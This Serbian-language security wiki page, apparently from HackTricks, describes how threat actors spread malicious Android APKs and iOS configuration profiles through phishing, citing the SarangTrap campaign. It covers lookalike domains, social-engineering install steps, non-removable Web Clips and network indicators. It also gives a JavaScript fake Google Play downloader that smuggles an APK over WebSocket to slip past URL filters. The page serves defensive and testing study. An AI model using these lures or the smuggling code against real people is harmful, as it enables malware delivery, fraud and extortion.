# Mobilni phishing i distribucija zlonamernih aplikacija (Android i iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica obrađuje tehnike koje akteri pretnji koriste za distribuciju **zlonamernih Android APK-ova** i **iOS profila mobilne konfiguracije** putem phishinga (SEO, društveni inženjering, lažne prodavnice, aplikacije za upoznavanje itd.).
> Materijal je prilagođen kampanji SarangTrap, koju su razotkrili Zimperium zLabs (2025), i drugim javnim istraživanjima.<sup>[[1]](#references)</sup>

## Tok napada

1. **SEO/phishing infrastruktura**
   * Registrujte desetine domena koji liče na legitimne (upoznavanje, deljenje u cloud-u, servis automobila…).  
     – Koristite ključne reči na lokalnom jeziku i emodžije u elementu `<title>` da biste se bolje rangirali na Google-u.  
     – Na istoj odredišnoj stranici hostujte uputstva za instalaciju za *Android* (`.apk`) i iOS.
2. **Preuzimanje prve faze**
   * Android: direktna veza do *nepotpisanog* APK-a ili APK-a iz „prodavnice treće strane“.  
   * iOS: `itms-services://` ili obična HTTPS veza do zlonamernog profila **mobileconfig** (pogledajte ispod).
3. **Ponašanje Android malvera nakon instalacije**
   * Izvršavanje kontrolisano preko C2, zloupotreba dozvola, zaobilaženje dropper-a, prikupljanje podataka u pozadini i druga ponašanja malvera nakon instalacije obrađeni su na posebnoj stranici Android Malware Post-Exploitation ispod.
4. **Tehnika isporuke za iOS**
   * Jedan **profil mobilne konfiguracije** može da zatraži `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. kako bi uređaj upisao u nadzor sličan „MDM“-u.  
   * Uputstva za društveni inženjering:
     1. Otvorite Settings ➜ *Profile downloaded*.
     2. Dodirnite *Install* tri puta (snimci ekrana se nalaze na phishing stranici).  
     3. Verujte nepotpisanom profilu ➜ napadač dobija ovlašćenja *Contacts* i *Photo* bez provere u App Store-u.
5. **iOS Web Clip payload (ikona phishing aplikacije)**
   * Payload-i `com.apple.webClip.managed` mogu da **zakače phishing URL na početni ekran** sa brendiranom ikonom/oznakom.
   * Web Clips mogu da rade **preko celog ekrana** (sakrivajući interfejs pregledača) i da budu označeni kao **nemogući za uklanjanje**, primoravajući žrtvu da izbriše profil da bi uklonila ikonu.<sup>[[3]](#references)</sup>
6. **Mrežni sloj**
   * Običan HTTP, često na portu 80, sa HOST zaglavljem poput `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako se uočava).

## Android Malware Post-Exploitation

Za post-install Android malware taktike, kao što su C2, zloupotreba Accessibility-ja, overlay-i, ATS automatizacija, staged DEX učitavanje, premium SMS i postojanost, pogledajte:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK krijumčarenje zasnovano na Socket.IO/WebSocket-u + lažne Google Play stranice

Napadači sve češće zamenjuju statične APK veze Socket.IO/WebSocket kanalom ugrađenim u mamce koji izgledaju kao Google Play. Time se prikriva URL payloada, zaobilaze filteri za URL-ove/ekstenzije i zadržava realističan doživljaj instalacije.<sup>[[2]](#references)[[4]](#references)</sup>

Tipičan tok klijenta uočen u praksi:

<details>
<summary>Lažni Play downloader zasnovan na Socket.IO-u (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Zašto zaobilazi jednostavne kontrole:
- Ne otkriva se statički APK URL; payload se rekonstruiše u memoriji iz WebSocket frame-ova.
- URL/MIME/extension filteri koji blokiraju direktne .apk odgovore možda neće prepoznati binarne podatke tunelovane kroz WebSocket/Socket.IO.
- Crawler-i i URL sandbox-i koji ne izvršavaju WebSocket konekcije neće preuzeti payload.

Pogledajte i WebSocket tradecraft i alate:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Tamna strana ljubavi: SarangTrap kampanja iznude](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Podešavanja Web Clips payloada za Apple uređaje](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Bankarski trojanac usmeren na korisnike Androida u Indoneziji i Vijetnamu](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
